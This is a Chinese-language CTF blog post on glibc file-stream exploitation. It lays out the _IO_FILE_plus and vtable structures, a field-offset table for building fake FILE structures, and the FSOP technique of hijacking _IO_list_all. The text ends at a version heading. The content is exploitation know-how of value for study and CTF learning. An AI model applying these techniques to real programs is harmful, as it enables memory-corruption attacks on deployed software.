<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker.png?v=5.1.4">


  <link rel="mask-icon" href="/images/hacker.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Heap,IO," />










<meta name="description" content="IO基础FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流，常被一系列流操作（fopen()、fread()、fclose()等）使用，其动态指针由fopen()函数创建，存储在堆上（stdin、stdout、stderr这三个位于libc数据段）。在libc2.23版本中，这个结构体是_IO_FILE_plus，包含了一个_IO_FILE结构体和一个指向_IO_jump_t结">
<meta property="og:type" content="article">
<meta property="og:title" content="IO 总结">
<meta property="og:url" content="https://pursuezhou.github.io/2022/08/14/Pwn/IO/index.html">
<meta property="og:site_name" content="Pursue">
<meta property="og:description" content="IO基础FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流，常被一系列流操作（fopen()、fread()、fclose()等）使用，其动态指针由fopen()函数创建，存储在堆上（stdin、stdout、stderr这三个位于libc数据段）。在libc2.23版本中，这个结构体是_IO_FILE_plus，包含了一个_IO_FILE结构体和一个指向_IO_jump_t结">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-08-13T16:00:00.000Z">
<meta property="article:modified_time" content="2024-03-13T11:59:50.612Z">
<meta property="article:author" content="Pursue">
<meta property="article:tag" content="Heap">
<meta property="article:tag" content="IO">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://pursuezhou.github.io/2022/08/14/Pwn/IO/"/>





  <title>IO 总结 | Pursue</title>
  








<meta name="generator" content="Hexo 7.1.1"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Pursue</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Better to light one candle than to curse the darkness.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://pursuezhou.github.io/2022/08/14/Pwn/IO/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/wechat.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pursue">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">IO 总结</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-14T00:00:00+08:00">
                2022-08-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn/" itemprop="url" rel="index">
                    <span itemprop="name">Pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="IO基础"><a href="#IO基础" class="headerlink" title="IO基础"></a>IO基础</h2><p>FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流，常被一系列流操作（<code>fopen()</code>、<code>fread()</code>、<code>fclose()</code>等）使用，其动态指针由<code>fopen()</code>函数创建，存储在堆上（<code>stdin</code>、<code>stdout</code>、<code>stderr</code>这三个位于<code>libc</code>数据段）。在<code>libc2.23</code>版本中，这个结构体是<code>_IO_FILE_plus</code>，包含了一个<code>_IO_FILE</code>结构体和一个指向<code>_IO_jump_t</code>结构体的指针<code>vtable</code>，一些函数在调用的时候会取出<code>vtable</code>所指向的函数，<code>vtable</code>也称为虚表。</p>
<span id="more"></span>

<p>FILE结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>_IO_jump_t</code>结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简化一下（来自Wiki）</span></span><br><span class="line"><span class="type">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这边引用了e4l4师傅的字段长度表，方便查询和构造：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus_size = &#123;</span><br><span class="line">	<span class="string">&#x27;i386&#x27;</span>:<span class="number">0x98</span>,</span><br><span class="line">	<span class="string">&#x27;amd64&#x27;</span>:<span class="number">0xe0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">    <span class="string">&#x27;i386&#x27;</span>:&#123;</span><br><span class="line">        <span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">        <span class="number">0x4</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">        <span class="number">0xc</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x10</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x14</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x18</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x1c</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x24</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x2c</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">        <span class="number">0x34</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">        <span class="number">0x3c</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">        <span class="number">0x40</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x44</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">        <span class="number">0x46</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x47</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">        <span class="number">0x48</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">        <span class="number">0x4c</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x54</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">        <span class="number">0x58</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">        <span class="number">0x5c</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">        <span class="number">0x60</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">        <span class="number">0x64</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">        <span class="number">0x68</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">        <span class="number">0x6c</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">        <span class="number">0x94</span>:<span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;amd64&#x27;</span>:&#123;</span><br><span class="line">        <span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">        <span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">        <span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">        <span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">        <span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">        <span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">        <span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">        <span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">        <span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">        <span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">        <span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">        <span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">        <span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">        <span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">        <span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP是一种劫持<code>_IO_list_all</code>（<code>libc.so</code>中的全局变量）来伪造链表的利用技术，通过调用<code>_IO_flush_all_lockp()</code>函数触发，这个函数会刷新<code>_IO_list_all</code>链表中所有项的文件流，相当于对每个<code>FILE</code>调用<code>fflush</code>来清空缓冲区，也对应着会调用<code>_IO_FILE_plus.vtable</code>中的<code>_IO_overflow</code>函数。该方法在<code>libc-2.28</code>之后失效。</p>
<p><code>_IO_flush_all_lockp()</code>函数在以下几种情况会被调用：</p>
<ul>
<li><p><code>libc</code>检测到内存错误从而执行<code>abort</code>流程，函数调用流程如下：</p>
<p><code>malloc_printerr</code>-&gt;<code>__libc_message</code>-&gt;<code>__GI_abort_</code>-&gt;<code>_IO_flush_all_lockp</code>-&gt;<code>_IO_OVERFLOW</code></p>
</li>
<li><p>执行<code>exit</code>函数</p>
</li>
<li><p><code>main</code>函数返回时</p>
</li>
</ul>
<h3 id="2-23版本"><a href="#2-23版本" class="headerlink" title="2.23版本"></a>2.23版本</h3><p>下面是<code>_IO_flush_all_lockp</code>函数的源码：</p>
